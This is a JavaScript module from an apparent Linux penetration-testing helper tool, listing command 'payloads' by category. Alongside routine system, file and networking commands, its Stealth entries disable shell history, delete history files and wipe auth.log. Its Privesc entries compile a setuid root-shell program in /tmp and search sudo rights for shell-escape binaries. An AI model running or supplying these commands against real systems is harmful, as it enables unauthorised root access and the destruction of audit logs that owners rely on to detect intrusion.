var prompt = require('prompt'),
	ask = require('../modules/questionUser'),
	M = require('mstring');

// Payload Array
arrayLinux = []

// Load payload function
var Load = function(obj){
	arrayLinux.push(obj)
}

// Question helper method
var questions = [];
var question = function(val){
	questions.push(val);
}


/*
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)

	Ex:

	callback: function(bro){
		question.ask("Do you even ...?") // Ask the user something, return value will be entered as PROMPT value
		question.ask(ask.http) // Ask user if they want to start a webserver after the payload is printed
	}


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis

	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>


*/



// ############### System Info ######################

Load({ payload: "nbtstat -A <RHOST>", desc: "Get hostname for <ip address>", category: "System Info"})
Load({ payload: "id", desc: "Get current username", category: "System Info"})
Load({ payload: "who -a", desc: "Info about currently logged on users", category: "System Info"})
Load({ payload: "w", desc: "Info about currently logged on users including their active processes", category: "System Info"})
Load({ payload: "last -a", desc: "Basic info about recently logged on users", category: "System Info"})
Load({ payload: "ps -ef", desc: "Process listing", category: "System Info"})
Load({ payload: "df -h", desc: "Disk usage (free)", category: "System Info"})
Load({ payload: "uname -a", desc: "Kernel version/CPU", category: "System Info"})
Load({ payload: "cat /etc/issue", desc: "Show OS Info", category: "System Info"})
Load({ payload: "cat /etc/*release*", desc: "Show OS version info", category: "System Info"})
Load({ payload: "cat /proc/version", desc: "Show kernel info", category: "System Info"})
Load({ payload: "rpm --query -all", desc: "Show installed packages (Redhat)", category: "System Info"})
Load({ payload: "rpm -vih *.rpm", desc: "Install RPM package (-e remove)", category: "System Info"})
Load({ payload: "dpkg -get-selections", desc: "Show installed packages (Ubuntu)", category: "System Info"})
Load({ payload: "dpkg -I *.deb", desc: "Install DEB package (-r remove)", category: "System Info"})
Load({ payload: "ps -ef", desc: "Process listing", category: "System Info"})
Load({
	desc: "Get all environment variables seen by a process",
	payload: "cat /proc/<PROMPT (PID)>/environ | tr '\\0' '\\n'",
	callback: function(bro){
		question("What process would you like to check?");
		ask.some(questions, bro);
	},
	category: "System Info"
})

// ############### File System  ######################

// Linux File Commands pg 6
Load({ payload: "diff file1 file2", desc: "Compare two files", category: "File System"})
Load({ payload: "strings -n 5", desc: "Set minimum string length", category: "File System"})
Load({ payload: "find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null", desc: "Find all SUID and SGID files", category: "File System"})
Load({ payload: "find . -type f -mmin -5 2>/dev/null", desc: "Find all files modified in the last 5 minutes", category: "File System"})

Load({
	desc: "Find files and grep results",
	payload: "find . -type f -exec grep -IHin '<PROMPT (search string)>' 2>/dev/null {} +",
	callback: function(bro){
		question("What search term would you like to use?");
		ask.some(questions, bro);
	},
	category: "File System"
})


// Linux File System Structure pg 7
Load({
	title: "Linux File System Overview",
	payload: "Linux File System Overview",
	sample: "A quick look at common linux directories",
	category: "File System",
	callback: function(returnToPrepare){
		var m = M(function(){
		/***

		/bin 		User binaries
		/boot		Boot related files
		/dev		System devices
		/etc		System config files
		/home 		Home directory for each user
		/lib 		Important software libraries
		/opt 		Third party software
		/proc 		System and other running programs
		/root		Directory of the user "root"
		/sbin		Sys admin binaries
		/tmp 		Temporary files
		/usr 		Shareable read-only data
		/var 		Contains variable data (ie: logging files)

		***/})

		console.log(m)
		prompt.message = "Press enter to continue"
		prompt.get([{name: '_', description: ':'}], function(err, result){
			returnToPrepare(1)
		})

	}
})

Load({
	title: "Config locations",
	payload: "Config locations",
	sample: "Common locations for config files",
	category: "File System",
	callback: function(returnToPrepare){
		var m = M(function(){
		/***

		/etc/issue
		/etc/master.passwd
		/etc/crontab
		/etc/sysctl.conf
		/etc/resolv.conf
		/etc/syslog.conf
		/etc/chttp.conf
		/etc/lighttpd.conf
		/etc/cups/cupsd.conf
		/etc/inetd.conf
		/opt/lampp/etc/httpd.conf
		/etc/samba/smb.conf
		/etc/openldap/ldap.conf
		/etc/ldap/ldap.conf
		/etc/exports
		/etc/auto.master
		/etc/auto_master
		/etc/fstab

		***/})

		console.log(m)
		prompt.message = "Press enter to continue"
		prompt.get([{name: '_', description: ':'}], function(err, result){
			returnToPrepare(1)
		})

	}
})


// ############### Networking  ######################
// Add ssh port forwarding?
// Linux Network Commands pg 5
Load({ payload: "watch ss -tp", desc: "Network connections", category: "Networking"})
Load({ payload: "netstat -tulpn", desc: "Connections with PIDs", category: "Networking"})
Load({ payload: "lsof -i TCP -n -P | grep LISTEN", desc: "Connections with PIDs", category: "Networking"})
Load({ payload: "route -n", desc: "Find the ip of your gateway", category: "Networking"})
Load({ payload: "route -n get default", desc: "Find the ip of your gateway (MacOS)", category: "Networking"})

Load({
	payload: "mount -t cifs <PROMPT> -o username=,password= <PATH (local path to mount)>",
	desc: "Mount an SMB Share (null session)",
	category: "Networking",
	callback: function(bro){
		question("What's the path of the SMB share? (Ex: //server/ipc$");
		ask.some(questions, bro);
	}
})

Load({
	payload: "ssh -L <LPORT>:localhost:<RPORT> <USER>@<RHOST>",
	desc: "SSH Local Port Forwarder",
	category: "Networking",
})

Load({
	payload: "ssh -D <LPORT> <USER>@<RHOST>",
	desc: "SSH SOCKS Proxy",
	category: "Networking",
})


// ############### Stealth  ######################

Load({ payload: "export HISTSIZE=0", desc: "Change history file length to 0", category: "Stealth"})
Load({ payload: "export HISTFILESIZE=0", desc: "Change history file length to 0", category: "Stealth"})
Load({ payload: "export HISTFILE=/dev/null", desc: "Point history file to /dev/null", category: "Stealth"})
Load({ payload: "export HISTCONTROL=ignorespace", desc: "Ignore commands preceded with a space", category: "Stealth"})
Load({ payload: "export HISTCONTROL=ignorespace && HLEN=$(history | wc -l) && history -d $HLEN", desc: "Ignore commands preceded with a space and delete last entry in history", category: "Stealth"})
Load({ payload: "echo \"\" > /var/log/auth.log", desc: "Clear auth.log", category: "Stealth"})
Load({ payload: "history -c", desc: "Clear bash history", category: "Stealth"})
Load({ payload: "touch ~/.bash_history", desc: "Clear bash history", category: "Stealth"})
Load({ payload: "rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null", desc:"Permanently remove bash history", category:"Stealth"})

// ############### Privesc  ######################

// Credit to @LuxCupitor
Load({ title: "Write r00t.c to the /tmp directory and compile", payload: "echo -e '#include <unistd.h>\\nint main(int argc, char **argv)\\n{\\nsetuid(0);\\nsetgid(0);\\nexecl(\"/bin/sh\", \"sh\", NULL);\\nreturn 1;\\n}\\n' > /tmp/r00t.c;gcc /tmp/r00t.c -o /tmp/r00t", category: "Privesc"})
Load({ title: "Check for privesc via sudo privileges", payload: "sudo -S -l 2>/dev/null | grep -w 'nmap\\|perl\\|awk\\|find\\|bash\\|sh\\|man\\|more\\|less\\|vi\\|vim\\|nc\\|netcat\\|python\\|ruby\\|lua\\|irb\\|chown\\|chmod\\|zip\\|tar\\|tcpdump\\|gdb'", category: "Privesc"})
//
/*
######################################################
############### End of Payloads ######################
######################################################
*/

module.exports = arrayLinux;
